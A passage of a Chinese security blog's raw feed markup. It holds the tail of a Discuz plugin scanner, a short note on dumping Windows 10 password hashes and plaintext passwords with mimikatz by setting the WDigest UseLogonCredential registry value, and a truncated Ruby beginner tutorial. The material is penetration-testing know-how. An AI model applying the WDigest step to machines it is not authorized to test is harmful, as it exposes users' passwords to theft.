class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;dzpluginlist_t.txt&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;():&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print i.strip()&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        checkplugin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;())&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; l &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;/plugin.php?id=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;</code><div><br></div><div>3.项目地址</div><div><a href="https://github.com/Tycx2ry/discuz-plugin-scan" target="_blank" rel="noopener">https://github.com/Tycx2ry/discuz-plugin-scan</a> </div><div><br></div></li></ol><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;&amp;nbsp; &amp;nbsp;为了做渗透测试的时候，方便快速寻找discuz插件，于是用python简单写了个小工具&lt;/font&gt;，代码写的不是很讲究，将就用&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;1.在discuz官方爬取插件字典&lt;/div
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>windows 10 dump hash and plaintext passwords</title>
    <link href="https://tycx2ry.github.io/2015/09/09/windows-10-dump-hash-and-plaintext-passwords/"/>
    <id>https://tycx2ry.github.io/2015/09/09/windows-10-dump-hash-and-plaintext-passwords/</id>
    <published>2015-09-09T02:12:31.000Z</published>
    <updated>2018-02-26T05:36:35.272Z</updated>
    
    <content type="html"><![CDATA[<div>工具：mimkatz2.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></div><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RWMC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="https://github.com/giMini/RWMC" target="_blank" rel="noopener"></a><a href="https://github.com/giMini/RWMC" target="_blank" rel="noopener">https://github.com/giMini/RWMC</a>&nbsp;&nbsp;使用：<a href="http://sysadminconcombre.blogspot.ca/2015/07/how-to-hack-windows-password.html" target="_blank" rel="noopener"></a><a href="http://sysadminconcombre.blogspot.ca/2015/07/how-to-hack-windows-password.html" target="_blank" rel="noopener">http://sysadminconcombre.blogspot.ca/2015/07/how-to-hack-windows-password.html</a></div><div><br></div><div><br></div><div>关键是要开启HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</div><div>UseLogonCredential键值设置为1</div><div><br></div><div>缺陷：windows默认设置是0，设置为1后需要重新启动</div><div><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-5a27790d3579712f63eea3f9b595f494_Image.png" alt=""></div><div><br></div><div><br></div><div><br></div><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div&gt;工具：mimkatz2.0 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https:/
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ruby入门学习</title>
    <link href="https://tycx2ry.github.io/2015/09/06/ruby-e5-85-a5-e9-97-a8-e5-ad-a6-e4-b9-a0/"/>
    <id>https://tycx2ry.github.io/2015/09/06/ruby-e5-85-a5-e9-97-a8-e5-ad-a6-e4-b9-a0/</id>
    <published>2015-09-06T11:31:21.000Z</published>
    <updated>2018-02-26T05:36:35.272Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-BEGIN-END-语法"><a href="#1-BEGIN-END-语法" class="headerlink" title="1.BEGIN/END 语法"></a>1.BEGIN/END 语法</h3><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.3.  <code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;This is main Ruby Program&quot;&lt;/span&gt;</code><br>4.5.  <code>&lt;span class=&quot;pln&quot;&gt;END &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Terminating Ruby Program&quot;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;BEGIN &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Initializing Ruby Program&quot;&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Initializing&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is main &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Terminating&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Program&lt;/span&gt;</code></pre></div></div><h3 id="2-注释语法"><a href="#2-注释语法" class="headerlink" title="2.注释语法"></a>2.注释语法</h3><div>单行注释： #</div><div>多行注释：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; too&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a comment&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; too&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;I said that already&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3.变量"></a>3.变量</h3><div>局部变量 wenxiao</div><div>实例变量 @wenxiao</div><div>类变量 @@wenxiao</div><div>全局变量 $wenxiao</div><h3 id="4-类"><a href="#4-类" class="headerlink" title="4.类"></a>4.类</h3><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;kwd&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Sample&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;   @@wenxiao_a&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;def&amp;nbsp;initialize()&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;        @wenxiao_b&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;hello init&quot;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &amp;nbsp;end&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def hello()&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello Ruby!&quot;&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;str&quot;&gt;      puts &quot;bc#@wenxiao_b&quot;  &lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;str&quot;&gt;      puts &quot;#@@wenxiao_a&quot;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;com&quot;&gt;# Now using above class to create objects&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;pln&quot;&gt;object &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Sample&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;pln&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;hello&lt;/span&gt;</code></pre></div><h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h3><p></p></div><div>例子1:</div><div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><ol><li><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;ary &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;fred&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;This is a string&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;last element&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;ary&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts i&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></ol></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;fred&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;lit&quot;&gt;3.14&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is a string&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;last element&lt;/span&gt;</code></p></li></pre></div></div></div>例子2:<div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;hsh &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; colors &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0xf00&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0x0f0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;blue&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0x00f&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;hsh&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; print key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; is &quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\n&quot;&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;green is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;240&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;red is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3840&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;blue is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt;</code></p></li></pre></div><div>迭代器</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></p></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code></p></li></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; print n&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; &#39;&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;15&lt;/span&gt;</code></p></li></pre></div><div><br></div></div></div></div></div></div><p></p><h3 id="6-defined-操作符"><a href="#6-defined-操作符" class="headerlink" title="6.defined?操作符"></a>6.defined?操作符</h3><div><div>defined? 是一个特殊的操作符采取的形式的方法调用，以确定是否通过表达式定义。</div><div>如果没有被定义的表达式，它返回一个描述字符串求解出的表达式或nil</div><div>&nbsp;</div><div>有很多种用法 defined? 操作符:&nbsp;</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if variable is initialized&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;foo &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;42&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; foo&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;local-variable&quot;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $_&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;global-variable&quot;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; bar&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (undefined)&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; method_call &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if a method is defined&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;method&quot;&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (bar is not defined here)&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; 